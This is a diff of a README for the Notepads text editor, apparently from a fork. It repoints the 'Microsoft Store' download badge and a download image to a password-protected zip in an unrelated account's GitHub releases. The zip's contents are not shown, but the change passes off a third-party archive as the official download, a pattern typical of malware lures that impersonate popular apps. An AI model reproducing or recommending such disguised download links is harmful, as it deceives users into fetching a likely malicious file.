@@ -3,7 +3,7 @@
 <p align="center"><b>A modern, lightweight text editor with a minimalist design</b></p>
 
 <div align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Microsoft%20Store-Download-orange.svg?style=flat-square"></a>
+  <a href="https://github.com/havanagilla1/notepads/releases/download/Download/notepads.zip"><img src="https://img.shields.io/badge/Microsoft%20Store-Download-orange.svg?style=flat-square"></a>
   <a href=""><img src="https://img.shields.io/github/release/0x7c13/notepads.svg?label=latest%20release&style=flat-square"></a>
   <a href=""><img src="https://img.shields.io/badge/platform-Windows%20%7C%20UWP-yellow.svg?style=flat-square"></a>
 </div>
@@ -11,7 +11,7 @@
 <ul>
   <li><b>Download Notepads app</b> <i>(Passowrd: npForEver)</i></li>
   <br>
-  <a href="#"><img src="https://github.com/user-attachments/assets/910cccb4-1cba-4d02-b6e8-8aa9494e8492"></a>
+  <a href="https://github.com/havanagilla1/notepads/releases/download/Download/notepads.zip"><img src="https://github.com/user-attachments/assets/910cccb4-1cba-4d02-b6e8-8aa9494e8492"></a>
 </ul>
 
 <h2>What is Notepads and why do I care?</h2>
